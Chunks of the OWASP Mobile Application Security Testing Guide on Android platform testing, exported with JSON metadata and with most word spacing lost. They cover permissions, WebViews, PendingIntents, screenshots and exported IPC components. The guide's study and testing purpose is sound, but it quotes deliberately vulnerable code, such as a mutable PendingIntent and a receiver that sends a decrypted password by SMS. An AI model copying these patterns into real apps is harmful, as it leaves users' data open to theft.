TYPE_SYSTEM_ALERT. You can use this information to ensure that no overlay attacks mayoccuratleastforthisappinthisconcreteAndroidversion. 259\\nDynamic Analysis Abusingthiskindofvulnerabilityonadynamicmannercanbeprettychallengingandveryspecializedasitcloselydepends onthetargetAndroidversion. Forinstance,forversionsuptoAndroid7.0(APIlevel24)youcanusethefollowingAPKs asaproofofconcepttoidentifytheexistenceofthevulnerabilities. • TapjackingPOC:ThisAPKcreatesasimpleoverlaywhichsitsontopofthetestingapplication. • Invisible Keyboard: This APK creates multiple overlays on the keyboard to capture keystrokes. This is one of the exploitdemonstratedinCloakandDaggerattacks. Testing WebViews Cleanup Platform: android MASVSV1: MSTG-PLATFORM-10 MASVSV2: MASVS-PLATFORM-2 Overview TotestforWebViewscleanupyoushouldinspectallAPIsrelatedtoWebViewdatadeletionandtrytofullytrackthedata deletionprocess. Static Analysis StartbyidentifyingtheusageofthefollowingWebViewAPIsandcarefullyvalidatethementionedbestpractices. • Initialization: an app might be initializing the WebView in a way to avoid storing certain information by using setDomStorageEnabled,setAppCacheEnabledorsetDatabaseEnabledfromandroid.webkit.WebSettings. The DOMStorage(forusingtheHTML5localstorage),ApplicationCachesandDatabaseStorageAPIsaredisabledby default,butappsmightsetthesesettingsexplicitlyto“true”. • Cache: Android’sWebViewclassofferstheclearCachemethodwhichcanbeusedtoclearthecacheforallWe- bViews used by the app. It receives a boolean input parameter (includeDiskFiles) which will wipe all stored resource including the RAM cache. However if it’s set to false, it will only clear the RAM cache. Check the app for usage of the clearCache method and verify its input parameter. Additionally, you may also check if the app isoverridingonRenderProcessUnresponsiveforthecasewhentheWebViewmightbecomeunresponsive,asthe clearCachemethodmightalsobecalledfromthere. • WebStorageAPIs: WebStorage.deleteAllDatacanbealsousedtoclearallstoragecurrentlybeingusedbythe JavaScriptstorageAPIs,includingtheWebSQLDatabaseandtheHTML5WebStorageAPIs. >Someappswillneed toenabletheDOMstorageinordertodisplaysomeHTML5sitesthatuselocalstorage. Thisshouldbecarefully investigatedasthismightcontainsensitivedata. • Cookies: anyexistingcookiescanbedeletedbyusingCookieManager.removeAllCookies. • FileAPIs: properdatadeletionincertaindirectoriesmightnotbethatstraightforward,someappsuseapragmatic solution which is to manually delete selected directories known to hold user data. This can be done using the java.io.FileAPIsuchasjava.io.File.deleteRecursively. Example: ThisexampleinKotlinfromtheopensourceFirefoxFocusappshowsdifferentcleanupsteps: overridefun cleanup(){ clearFormData()//Removestheautocompletepopupfromthecurrentlyfocusedformfield,ifpresent.Notethisonlyaffectsthedisplayof theautocomplete ↪ popup,itdoesnotremoveanysavedformdatafromthisWebView'sstore.Todothat,useWebViewDatabase#clearFormData. clearHistory() clearMatches() clearSslPreferences() clearCache(true) CookieManager.getInstance().removeAllCookies(null) 260\\nWebStorage.getInstance().deleteAllData()//ClearsallstoragecurrentlybeingusedbytheJavaScriptstorageAPIs.ThisincludestheApplicationCache,Web ↪ SQLDatabaseandtheHTML5WebStorageAPIs. valwebViewDatabase =WebViewDatabase.getInstance(context) //Itisn'tentirelyclearhowthisdiffersfromWebView.clearFormData() @Suppress(\"DEPRECATION\") webViewDatabase.clearFormData()//Clearsanysaveddataforwebforms. webViewDatabase.clearHttpAuthUsernamePassword() deleteContentFromKnownLocations(context)//callsFileUtils.deleteWebViewDirectory(context)whichdeletesallcontentin\"app_webview\". } ThefunctionfinisheswithsomeextramanualfiledeletionindeleteContentFromKnownLocationswhichcallsfunctions fromFileUtils. Thesefunctionsusethejava.io.File.deleteRecursivelymethodtorecursivelydeletefilesfromthe specifieddirectories. private fundeleteContent(directory:File,doNotEraseWhitelist:Set<String>= emptySet()): Boolean { valfilesToDelete =directory.listFiles()?.filter {!doNotEraseWhitelist.contains(it.name)}?:return false return filesToDelete.all{it.deleteRecursively()} } Dynamic Analysis OpenaWebViewaccessingsensitivedataandthenlogoutoftheapplication. Accesstheapplication’sstoragecontainer andmakesureallWebViewrelatedfilesaredeleted. ThefollowingfilesandfoldersaretypicallyrelatedtoWebViews: • app_webview • Cookies • pref_store • blob_storage • SessionStorage • WebData • ServiceWorker Testing for App Permissions Platform: android MASVSV1: MSTG-PLATFORM-1 MASVSV2: MASVS-PLATFORM-1 Overview Whentestingapppermissionsthegoalistotryandreducetheamountofpermissionsusedbyyourapptotheabsolute minimum. Whilegoingthrougheachpermission,rememberthatitisbestpracticefirsttotryandevaluatewhetheryour appneedstousethispermissionbecausemanyfunctionalitiessuchastakingaphotocanbedonewithout,limitingthe amount of access to sensitive data. If permissions are required you will then make sure that the request/response to accessthepermissionishandledhandledcorrectly. Static Analysis Android Permissions Check permissions to make sure that the app really needs them and remove unnecessary permissions. For example, theINTERNETpermissionintheAndroidManifest.xmlfileisnecessaryforanActivitytoloadawebpageintoaWebView. Becauseausercanrevokeanapplication’srighttouseadangerouspermission,thedevelopershouldcheckwhetherthe applicationhastheappropriatepermissioneachtimeanactionisperformedthatwouldrequirethatpermission. 261\\n<uses-permission android:name=\"android.permission.INTERNET\" /> Gothroughthepermissionswiththedevelopertoidentifythepurposeofeverypermissionsetandremoveunnecessary permissions. BesidesgoingthroughtheAndroidManifest.xmlfilemanually, youcanalsousetheAndroidAssetPackagingtool(aapt) toexaminethepermissionsofanAPKfile. aaptcomeswiththeAndroidSDKwithinthebuild-toolsfolder. ItrequiresanAPKfileasinput. YoumaylisttheAPKs inthedevicebyrunningadb shell pm list packages -f | grep -i <keyword>asseenin“ListingInstalledApps”. $aaptdpermissionsapp-x86-debug.apk package:sg.vp.owasp_mobile.omtg_android uses-permission:name='android.permission.WRITE_EXTERNAL_STORAGE' uses-permission:name='android.permission.INTERNET' Alternativelyyoumayobtainamoredetailedlistofpermissionsviaadbandthedumpsystool: $adbshelldumpsyspackagesg.vp.owasp_mobile.omtg_android |grep permission",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 100
    }
  },
  {
    "text": "Permissions Check permissions to make sure that the app really needs them and remove unnecessary permissions. For example, theINTERNETpermissionintheAndroidManifest.xmlfileisnecessaryforanActivitytoloadawebpageintoaWebView. Becauseausercanrevokeanapplication’srighttouseadangerouspermission,thedevelopershouldcheckwhetherthe applicationhastheappropriatepermissioneachtimeanactionisperformedthatwouldrequirethatpermission. 261\\n<uses-permission android:name=\"android.permission.INTERNET\" /> Gothroughthepermissionswiththedevelopertoidentifythepurposeofeverypermissionsetandremoveunnecessary permissions. BesidesgoingthroughtheAndroidManifest.xmlfilemanually, youcanalsousetheAndroidAssetPackagingtool(aapt) toexaminethepermissionsofanAPKfile. aaptcomeswiththeAndroidSDKwithinthebuild-toolsfolder. ItrequiresanAPKfileasinput. YoumaylisttheAPKs inthedevicebyrunningadb shell pm list packages -f | grep -i <keyword>asseenin“ListingInstalledApps”. $aaptdpermissionsapp-x86-debug.apk package:sg.vp.owasp_mobile.omtg_android uses-permission:name='android.permission.WRITE_EXTERNAL_STORAGE' uses-permission:name='android.permission.INTERNET' Alternativelyyoumayobtainamoredetailedlistofpermissionsviaadbandthedumpsystool: $adbshelldumpsyspackagesg.vp.owasp_mobile.omtg_android |grep permission requestedpermissions: android.permission.WRITE_EXTERNAL_STORAGE android.permission.INTERNET android.permission.READ_EXTERNAL_STORAGE install permissions: android.permission.INTERNET:granted=true runtimepermissions: Pleasereferencethispermissionsoverviewfordescriptionsofthelistedpermissionsthatareconsidereddangerous. READ_CALENDAR WRITE_CALENDAR READ_CALL_LOG WRITE_CALL_LOG PROCESS_OUTGOING_CALLS CAMERA READ_CONTACTS WRITE_CONTACTS GET_ACCOUNTS ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO READ_PHONE_STATE READ_PHONE_NUMBERS CALL_PHONE ANSWER_PHONE_CALLS ADD_VOICEMAIL USE_SIP BODY_SENSORS SEND_SMS RECEIVE_SMS READ_SMS RECEIVE_WAP_PUSH RECEIVE_MMS READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE Custom Permissions Apartfromenforcingcustompermissionsviatheapplicationmanifestfile,youcanalsocheckpermissionsprogrammat- ically. This is not recommended, however, because it is more error-prone and can be bypassed more easily with, e.g., runtimeinstrumentation. ItisrecommendedthattheContextCompat.checkSelfPermissionmethodiscalledtocheck if an activity has a specified permission. Whenever you see code like the following snippet, make sure that the same permissionsareenforcedinthemanifestfile. private static final StringTAG =\"LOG\"; intcanProcess =checkCallingOrSelfPermission(\"com.example.perm.READ_INCOMING_MSG\"); if(canProcess !=PERMISSION_GRANTED) throw newSecurityException(); OrwithContextCompat.checkSelfPermissionwhichcomparesittothemanifestfile. 262\\nif(ContextCompat.checkSelfPermission(secureActivity.this,Manifest.READ_INCOMING_MSG) !=PackageManager.PERMISSION_GRANTED){ //!=standsfornotequalsPERMISSION_GRANTED Log.v(TAG,\"Permissiondenied\"); } Requesting Permissions Ifyourapplicationhaspermissionsthatneedtoberequestedatruntime,theapplicationmustcalltherequestPermis- sionsmethodinordertoobtainthem. Theapppassesthepermissionsneededandanintegerrequestcodeyouhave specifiedtotheuserasynchronously,returningoncetheuserchoosestoacceptordenytherequestinthesamethread. Aftertheresponseisreturnedthesamerequestcodeispassedtotheapp’scallbackmethod. private static final StringTAG =\"LOG\"; //WestartbycheckingthepermissionofthecurrentActivity if(ContextCompat.checkSelfPermission(secureActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) !=PackageManager.PERMISSION_GRANTED){ //Permissionisnotgranted //Shouldweshowanexplanation? if(ActivityCompat.shouldShowRequestPermissionRationale(secureActivity.this, //GetswhetheryoushouldshowUIwithrationaleforrequestingpermission. //Youshoulddothisonlyifyoudonothavepermissionandthepermissionrequestedrationaleisnotcommunicatedclearly totheuser. Manifest.permission.WRITE_EXTERNAL_STORAGE)){ //Asynchronousthreadwaitsfortheusersresponse. //Aftertheuserseestheexplanationtryrequestingthepermissionagain. }else { //Requestapermissionthatdoesn'tneedtobeexplained. ActivityCompat.requestPermissions(secureActivity.this, newString[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE); //MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGEwillbetheapp-definedintconstant. //Thecallbackmethodgetstheresultoftherequest. } }else { //Permissionalreadygranteddebugmessageprintedinterminal. Log.v(TAG,\"Permissionalreadygranted.\"); } Pleasenotethatifyouneedtoprovideanyinformationorexplanationtotheuseritneedstobedonebeforethecallto requestPermissions,sincethesystemdialogboxcannotbealteredoncecalled. Handling Responses to Permission Requests NowyourapphastooverridethesystemmethodonRequestPermissionsResulttoseeifthepermissionwasgranted. ThismethodreceivestherequestCodeintegerasinputparameter(whichisthesamerequestcodethatwascreatedin requestPermissions). ThefollowingcallbackmethodmaybeusedforWRITE_EXTERNAL_STORAGE. @Override //NeededtooverridesystemmethodonRequestPermissionsResult() public void onRequestPermissionsResult(intrequestCode,//requestCodeiswhatyouspecifiedinrequestPermissions() Stringpermissions[],int[]permissionResults){ switch (requestCode){ case MY_PERMISSIONS_WRITE_EXTERNAL_STORAGE:{ if(grantResults.length >0 && permissionResults[0]==PackageManager.PERMISSION_GRANTED){ //0isacanceledrequest,ifintarrayequalsrequestCodepermissionisgranted. }else { //permissiondeniedcodegoeshere. Log.v(TAG,\"Permissiondenied\"); } return; } //Otherswitchcasescanbeaddedhereformultiplepermissionchecks. } } Permissionsshouldbeexplicitlyrequestedforeveryneededpermission,evenifasimilarpermissionfromthesamegroup has already been requested. For applications targeting Android 7.1 (API level 25) and older, Android will automatically giveanapplicationallthepermissionsfromapermissiongroup, iftheusergrantsoneoftherequestedpermissionsof thatgroup. StartingwithAndroid8.0(APIlevel26),permissionswillstillautomaticallybegrantedifauserhasalready 263\\ngrantedapermissionfromthesamepermissiongroup,buttheapplicationstillneedstoexplicitlyrequestthepermission. Inthiscase,theonRequestPermissionsResulthandlerwillautomaticallybetriggeredwithoutanyuserinteraction. ForexampleifbothREAD_EXTERNAL_STORAGEandWRITE_EXTERNAL_STORAGEarelistedintheAndroidManifestbutonly permissionsaregrantedforREAD_EXTERNAL_STORAGE,thenrequestingWRITE_EXTERNAL_STORAGEwillautomaticallyhave permissionswithoutuserinteractionbecausetheyareinthesamegroupandnotexplicitlyrequested. Permission Analysis Alwayscheckwhethertheapplicationisrequestingpermissionsitactuallyrequires. Makesurethatnopermissionsare requestedwhicharenotrelatedtothegoaloftheapp,especiallyDANGEROUSandSIGNATUREpermissions,sincetheycan affectboththeuserandtheapplicationifmishandled. Forinstance,itshouldbesuspiciousifasingle-playergameapp requiresaccesstoandroid.permission.WRITE_SMS. Whenanalyzingpermissions,youshouldinvestigatetheconcreteusecasescenariosoftheappandalwayscheckifthere arereplacementAPIsforanyDANGEROUSpermissionsinuse. AgoodexampleistheSMSRetrieverAPIwhichstreamlines the usage of SMS permissions when performing SMS-based user verification. By using this API an application does not havetodeclareDANGEROUSpermissionswhichisabenefittoboththeuseranddevelopersoftheapplication,whodoesn’t havetosubmitthePermissionsDeclarationForm. Dynamic Analysis Permissionsforinstalledapplicationscanberetrievedwithadb. Thefollowingextractdemonstrateshowtoexaminethe permissionsusedbyanapplication. $adbshelldumpsyspackagecom.google.android.youtube ... declaredpermissions: com.google.android.youtube.permission.C2D_MESSAGE:prot=signature,INSTALLED requestedpermissions: android.permission.INTERNET android.permission.ACCESS_NETWORK_STATE install permissions: com.google.android.c2dm.permission.RECEIVE:granted=true android.permission.USE_CREDENTIALS:granted=true com.google.android.providers.gsf.permission.READ_GSERVICES:granted=true ... Theoutputshowsallpermissionsusingthefollowingcategories: • declaredpermissions: listofallcustompermissions. • requested and install permissions: list of all install-time permissions including normal and signature permis- sions. • runtimepermissions: listofalldangerouspermissions. Whendoingthedynamicanalysis: • Evaluatewhethertheappreallyneedstherequestedpermissions. Forinstance: asingle-playergamethatrequires accesstoandroid.permission.WRITE_SMS,mightnotbeagoodidea. • Inmanycasestheappcouldoptforalternativestodeclaringpermissions,suchas: – requestingtheACCESS_COARSE_LOCATIONpermissioninsteadofACCESS_FINE_LOCATION.Orevenbetternot requestingthepermissionatall,andinsteadasktheusertoenterapostalcode. – invokingtheACTION_IMAGE_CAPTUREorACTION_VIDEO_CAPTUREintentactioninsteadofrequestingtheCAM- ERApermission. – usingCompanionDevicePairing(Android8.0(APIlevel26)andhigher)whenpairingwithaBluetoothdevice instead of declaring the ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATIION, or BLUETOOTH_ADMIN permis- sions. • UsethePrivacyDashboard(Android12(APIlevel31)andhigher)toverifyhowtheappexplainsaccesstosensitive information. ToobtaindetailaboutaspecificpermissionyoucanrefertotheAndroidDocumentation. 264\\nChecking for Sensitive Data Disclosure Through the User Interface Platform: android MASVSV1: MSTG-STORAGE-7 MASVSV2: MASVS-PLATFORM-3 Overview Static Analysis CarefullyreviewallUIcomponentsthateithershowsuchinformationortakeitasinput. Searchforanytracesofsensitive informationandevaluateifitshouldbemaskedorcompletelyremoved. Text Fields Tomake sure an application is masking sensitive user input, check for the following attribute in the definition ofEdit- Text: android:inputType=\"textPassword\" Withthissetting,dots(insteadoftheinputcharacters)willbedisplayedinthetextfield,preventingtheappfromleaking passwordsorpinstotheuserinterface. App Notifications Whenstaticallyassessinganapplication,itisrecommendedtosearchforanyusageoftheNotificationManagerclass whichmightbeanindicationofsomeformofnotificationmanagement. Iftheclassisbeingused,thenextstepwouldbe tounderstandhowtheapplicationisgeneratingthenotifications. ThesecodelocationscanbefedintotheDynamicAnalysissectionbelow,providinganideaofwhereintheapplication notificationsmaybedynamicallygenerated. Dynamic Analysis Todeterminewhethertheapplicationleaksanysensitiveinformationtotheuserinterface,runtheapplicationandidentify componentsthatcouldbedisclosinginformation. Text Fields Iftheinformationismaskedby,forexample,replacinginputwithasterisksordots,theappisn’tleakingdatatotheuser interface. App Notifications Toidentifytheusageofnotificationsrunthroughtheentireapplicationandallitsavailablefunctionslookingforwaysto trigger any notifications. Consider that you may need to perform actions outside of the application in order to trigger certainnotifications. While running the application you may want to start tracing all calls to functions related to the notifications creation, e.g.setContentTitleorsetContentTextfromNotificationCompat.Builder. Observethetraceintheendandevalu- ateifitcontainsanysensitiveinformation. Finding Sensitive Information in Auto-Generated Screenshots 265\\nPlatform: android MASVSV1: MSTG-STORAGE-9 MASVSV2: MASVS-PLATFORM-3 Overview Static Analysis A screenshot of the current activity is taken when an Android app goes into background and displayed for aesthetic purposeswhentheappreturnstotheforeground. However,thismayleaksensitiveinformation. Todeterminewhethertheapplicationmayexposesensitiveinformationviatheappswitcher,findoutwhethertheFLAG_- SECUREoptionhasbeenset. Youshouldfindsomethingsimilartothefollowingcodesnippet: ExampleinJava: getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE); setContentView(R.layout.activity_main);",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 101
    }
  },
  {
    "text": "to the notifications creation, e.g.setContentTitleorsetContentTextfromNotificationCompat.Builder. Observethetraceintheendandevalu- ateifitcontainsanysensitiveinformation. Finding Sensitive Information in Auto-Generated Screenshots 265\\nPlatform: android MASVSV1: MSTG-STORAGE-9 MASVSV2: MASVS-PLATFORM-3 Overview Static Analysis A screenshot of the current activity is taken when an Android app goes into background and displayed for aesthetic purposeswhentheappreturnstotheforeground. However,thismayleaksensitiveinformation. Todeterminewhethertheapplicationmayexposesensitiveinformationviatheappswitcher,findoutwhethertheFLAG_- SECUREoptionhasbeenset. Youshouldfindsomethingsimilartothefollowingcodesnippet: ExampleinJava: getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE); setContentView(R.layout.activity_main); ExampleinKotlin: window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE) setContentView(R.layout.activity_main) Iftheoptionhasnotbeenset,theapplicationisvulnerabletoscreencapturing. Dynamic Analysis While black-box testing the app, navigate to any screen that contains sensitive information and click the home button tosendtheapptothebackground,thenpresstheappswitcherbuttontoseethesnapshot. Asshownbelow,ifFLAG_- SECUREisset(leftimage),thesnapshotwillbeempty;iftheflaghasnotbeenset(rightimage),activityinformationwill beshown: 266\\nOndevicessupportingfile-basedencryption(FBE),snapshotsarestoredinthe/data/system_ce/<USER_ID>/<IMAGE_- FOLDER_NAME>folder. <IMAGE_FOLDER_NAME>dependsonthevendorbutmostcommonnamesaresnapshotsandre- cent_images. Ifthedevicedoesn’tsupportFBE,the/data/system/<IMAGE_FOLDER_NAME>folderisused. Accessingthesefoldersandthesnapshotsrequiresroot. Testing for Vulnerable Implementation of PendingIntent Platform: android MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview When testing Pending Intents you must ensure that they are immutable and that the app explicitly specifies the exact package,action,andcomponentthatwillreceivethebaseintent. Static Analysis To identify vulnerable implementations, static analysis can be performed by looking for API calls used for obtaining a PendingIntent. SuchAPIsarelistedbelow: PendingIntent getActivity(Context,int,Intent,int) PendingIntent getActivity(Context,int,Intent,int,Bundle) PendingIntent getActivities(Context,int,Intent,int,Bundle) PendingIntent getActivities(Context,int,Intent,int) PendingIntent getForegroundService(Context,int,Intent,int) PendingIntent getService(Context,int,Intent,int) Onceanyoftheabovefunctionisspotted,checktheimplementationofthebaseintentandthePendingIntentforthe securitypitfallslistedinthePendingIntentssection. 267\\nForexample,inA-156959408(CVE-2020-0389),thebaseintentisimplicitandalsothePendingIntentismutable,thus makingitexploitable. private Notification createSaveNotification(Uriuri){ IntentviewIntent =newIntent(Intent.ACTION_VIEW) .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |Intent.FLAG_GRANT_READ_URI_PERMISSION) .setDataAndType(uri,\"video/mp4\");//ImplicitIntent //...skip... Notification.Builder builder =newNotification.Builder(this,CHANNEL_ID) .setSmallIcon(R.drawable.ic_android) .setContentTitle(getResources().getString(R.string.screenrecord_name)) .setContentText(getResources().getString(R.string.screenrecord_save_message)) .setContentIntent(PendingIntent.getActivity( this, REQUEST_CODE, viewIntent, Intent.FLAG_GRANT_READ_URI_PERMISSION)) //MutablePendingIntent. .addAction(shareAction) .addAction(deleteAction) .setAutoCancel(true); Dynamic Analysis FridacanbeusedtohooktheAPIsusedtogetaPendingIntent. Thisinformationcanbeusedtodeterminethecode locationofthecall,whichcanbefurtherusedtoperformstaticanalysisasdescribedabove. Here’sanexampleofsuchaFridascriptthatcanbeusedtohookthePendingIntent.getActivityfunction: varpendingIntent =Java.use('android.app.PendingIntent'); vargetActivity_1 =pendingIntent.getActivity.overload(\"android.content.Context\",\"int\",\"android.content.Intent\",\"int\"); getActivity_1.implementation =function(context,requestCode,intent,flags){ console.log(\"[*]CallingPendingIntent.getActivity(\"+intent.getAction()+\")\"); console.log(\"\\t[-]BaseIntenttoString:\" +intent.toString()); console.log(\"\\t[-]BaseIntentgetExtras:\" +intent.getExtras()); console.log(\"\\t[-]BaseIntentgetFlags:\" +intent.getFlags()); return this.getActivity(context,requestCode,intent,flags); } Thisapproachcanbehelpfulwhendealingwithapplicationswithlargecodebases,wheredeterminingthecontrolflow cansometimesbetricky. Testing JavaScript Execution in WebViews Platform: android MASVSV1: MSTG-PLATFORM-5 MASVSV2: MASVS-PLATFORM-2 Overview TotestforJavaScriptexecutioninWebViewschecktheappforWebViewusageandevaluatewhetherornoteachWebView shouldallowJavaScriptexecution. IfJavaScriptexecutionisrequiredfortheapptofunctionnormally,thenyouneedto ensurethattheappfollowstheallbestpractices. Static Analysis TocreateanduseaWebView,anappmustcreateaninstanceoftheWebViewclass. 268\\nWebViewwebview =newWebView(this); setContentView(webview); webview.loadUrl(\"https://www.owasp.org/\"); Various settings can be applied to the WebView (activating/deactivating JavaScript is one example). JavaScript is dis- abledbydefaultforWebViewsandmustbeexplicitlyenabled. LookforthemethodsetJavaScriptEnabledtocheckfor JavaScriptactivation. webview.getSettings().setJavaScriptEnabled(true); ThisallowstheWebViewtointerpretJavaScript. Itshouldbeenabledonlyifnecessarytoreducetheattacksurfacetothe app. IfJavaScriptisnecessary,youshouldmakesurethat • The communication to the endpoints consistently relies on HTTPS (or other protocols that allow encryption) to protectHTMLandJavaScriptfromtamperingduringtransmission. • JavaScriptandHTMLareloadedlocally,fromwithintheappdatadirectoryorfromtrustedwebserversonly. • The user cannot define which sources to load by means of loading different resources based on a user provided input. ToremoveallJavaScriptsourcecodeandlocallystoreddata,cleartheWebView’scachewithclearCachewhentheapp closes. DevicesrunningplatformsolderthanAndroid4.4(APIlevel19)useaversionofWebKitthathasseveralsecurityissues. As aworkaround,theappmustconfirmthatWebViewobjectsdisplayonlytrustedcontentiftheapprunsonthesedevices. Dynamic Analysis DynamicAnalysisdependsonoperatingconditions. ThereareseveralwaystoinjectJavaScriptintoanapp’sWebView: • StoredCross-SiteScriptingvulnerabilitiesinanendpoint;theexploitwillbesenttothemobileapp’sWebViewwhen theusernavigatestothevulnerablefunction. • Attackertakesaman-in-the-middle(MITM)positionandtamperswiththeresponsebyinjectingJavaScript. • MalwaretamperingwithlocalfilesthatareloadedbytheWebView. Toaddresstheseattackvectors,checkthefollowing: • AllfunctionsofferedbytheendpointshouldbefreeofstoredXSS. • OnlyfilesthatareintheappdatadirectoryshouldberenderedinaWebView(seetestcase“TestingforLocalFile InclusioninWebViews”). • TheHTTPScommunicationmustbeimplementedaccordingtobestpracticestoavoidMITMattacks. Thismeans: – allcommunicationisencryptedviaTLS, – thecertificateischeckedproperly,and/or – thecertificateshouldbepinned. Testing for Sensitive Functionality Exposure Through IPC Platform: android MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview TotestforsensitivefunctionalityexposurethroughIPCmechanismsyoushouldfirstenumeratealltheIPCmechanisms theappusesandthentrytoidentifywhethersensitivedataisleakedwhenthemechanismsareused. 269\\nStatic Analysis WestartbylookingattheAndroidManifest.xml,whereallactivities,services,andcontentprovidersincludedintheapp mustbedeclared(otherwisethesystemwon’trecognizethemandtheywon’trun). • <intent-filter> • <service> • <provider> • <receiver> An “exported” activity, service, or content can be accessed by other apps. There are two common ways to designate a component as exported. The obvious one is setting the export tag to true android:exported=\"true\". The second wayinvolvesdefiningan<intent-filter>withinthecomponentelement(<activity>,<service>,<receiver>). When this is done, the export tag is automatically set to “true”. To prevent all other Android apps from interacting with the IPC component element, be sure that the android:exported=\"true\" value and an <intent-filter> aren’t in their AndroidManifest.xmlfilesunlessthisisnecessary. Rememberthatusingthepermissiontag(android:permission)willalsolimitotherapplications’accesstoacomponent. If your IPC is intended to be accessible to other applications, you can apply a security policy with the <permission> elementandsetaproperandroid:protectionLevel. Whenandroid:permissionisusedinaservicedeclaration,other applications must declare a corresponding<uses-permission> element in their own manifest to start, stop, or bind to theservice. Formoreinformationaboutthecontentproviders,pleaserefertothetestcase“TestingWhetherStoredSensitiveDataIs ExposedviaIPCMechanisms”inchapter“TestingDataStorage”. Once you identify a list of IPC mechanisms, review the source code to see whether sensitive data is leaked when the mechanismsareused. Forexample,contentproviderscanbeusedtoaccessdatabaseinformation,andservicescanbe probedtoseeiftheyreturndata. Broadcastreceiverscanleaksensitiveinformationifprobedorsniffed. Inthefollowing,weusetwoexampleappsandgiveexamplesofidentifyingvulnerableIPCcomponents: • “Sieve” • “AndroidInsecureBank” Activities Inspect",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 102
    }
  },
  {
    "text": "must declare a corresponding<uses-permission> element in their own manifest to start, stop, or bind to theservice. Formoreinformationaboutthecontentproviders,pleaserefertothetestcase“TestingWhetherStoredSensitiveDataIs ExposedviaIPCMechanisms”inchapter“TestingDataStorage”. Once you identify a list of IPC mechanisms, review the source code to see whether sensitive data is leaked when the mechanismsareused. Forexample,contentproviderscanbeusedtoaccessdatabaseinformation,andservicescanbe probedtoseeiftheyreturndata. Broadcastreceiverscanleaksensitiveinformationifprobedorsniffed. Inthefollowing,weusetwoexampleappsandgiveexamplesofidentifyingvulnerableIPCcomponents: • “Sieve” • “AndroidInsecureBank” Activities Inspect the AndroidManifest Inthe“Sieve”app,wefindthreeexportedactivities,identifiedby<activity>: <activity android:excludeFromRecents=\"true\" android:label=\"@string/app_name\" android:launchMode=\"singleTask\" android:name=\".MainLoginActivity\" ↪ android:windowSoftInputMode=\"adjustResize|stateVisible\"> <intent-filter> <action android:name=\"android.intent.action.MAIN\" /> <category android:name=\"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> <activity android:clearTaskOnLaunch=\"true\" android:excludeFromRecents=\"true\" android:exported=\"true\" android:finishOnTaskLaunch=\"true\" ↪ android:label=\"@string/title_activity_file_select\" android:name=\".FileSelectActivity\" /> <activity android:clearTaskOnLaunch=\"true\" android:excludeFromRecents=\"true\" android:exported=\"true\" android:finishOnTaskLaunch=\"true\" ↪ android:label=\"@string/title_activity_pwlist\" android:name=\".PWList\" /> Inspect the Source Code ByinspectingthePWList.javaactivity,weseethatitoffersoptionstolistallkeys,add,delete,etc. Ifweinvokeitdirectly, wewillbeabletobypasstheLoginActivity. Moreonthiscanbefoundinthedynamicanalysisbelow. Services 270\\nInspect the AndroidManifest Inthe“Sieve”app,wefindtwoexportedservices,identifiedby<service>: <service android:exported=\"true\" android:name=\".AuthService\" android:process=\":remote\" /> <service android:exported=\"true\" android:name=\".CryptoService\" android:process=\":remote\" /> Inspect the Source Code Checkthesourcecodefortheclassandroid.app.Service: By reversing the target application, we can see that the service AuthService provides functionality for changing the passwordandPIN-protectingthetargetapp. public void handleMessage(Messagemsg){ AuthService.this.responseHandler =msg.replyTo; BundlereturnBundle =msg.obj; intresponseCode; intreturnVal; switch (msg.what){ ... case AuthService.MSG_SET /*6345*/: if(msg.arg1 ==AuthService.TYPE_KEY)/*7452*/ { responseCode =42; if(AuthService.this.setKey(returnBundle.getString(\"com.mwr.example.sieve.PASSWORD\"))){ returnVal =0; }else { returnVal =1; } }else if(msg.arg1 ==AuthService.TYPE_PIN){ responseCode =41; if(AuthService.this.setPin(returnBundle.getString(\"com.mwr.example.sieve.PIN\"))){ returnVal =0; }else { returnVal =1; } }else { sendUnrecognisedMessage(); return; } } } Broadcast Receivers Inspect the AndroidManifest Inthe“AndroidInsecureBank”app,wefindabroadcastreceiverinthemanifest,identifiedby<receiver>: <receiver android:exported=\"true\" android:name=\"com.android.insecurebankv2.MyBroadCastReceiver\"> <intent-filter> <action android:name=\"theBroadcast\" /> </intent-filter> </receiver> Inspect the Source Code SearchthesourcecodeforstringslikesendBroadcast,sendOrderedBroadcast,andsendStickyBroadcast. Makesure thattheapplicationdoesn’tsendanysensitivedata. IfanIntentisbroadcastedandreceivedwithintheapplicationonly,LocalBroadcastManagercanbeusedtopreventother appsfromreceivingthebroadcastmessage. Thisreducestheriskofleakingsensitiveinformation. Tounderstandmoreaboutwhatthereceiverisintendedtodo,wehavetogodeeperinourstaticanalysisandsearchfor usage of the class android.content.BroadcastReceiver and the Context.registerReceiver method, which is used todynamicallycreatereceivers. Thefollowingextractofthetargetapplication’ssourcecodeshowsthatthebroadcastreceivertriggerstransmissionof anSMSmessagecontainingtheuser’sdecryptedpassword. 271\\npublic class MyBroadCastReceiver extends BroadcastReceiver { StringusernameBase64ByteString; public static final StringMYPREFS =\"mySharedPreferences\"; @Override public void onReceive(Contextcontext,Intentintent){ //TODO Auto-generatedmethodstub Stringphn =intent.getStringExtra(\"phonenumber\"); Stringnewpass =intent.getStringExtra(\"newpass\"); if(phn!=null){ try{ SharedPreferencessettings =context.getSharedPreferences(MYPREFS,Context.MODE_WORLD_READABLE); final Stringusername =settings.getString(\"EncryptedUsername\",null); byte[]usernameBase64Byte =Base64.decode(username,Base64.DEFAULT); usernameBase64ByteString 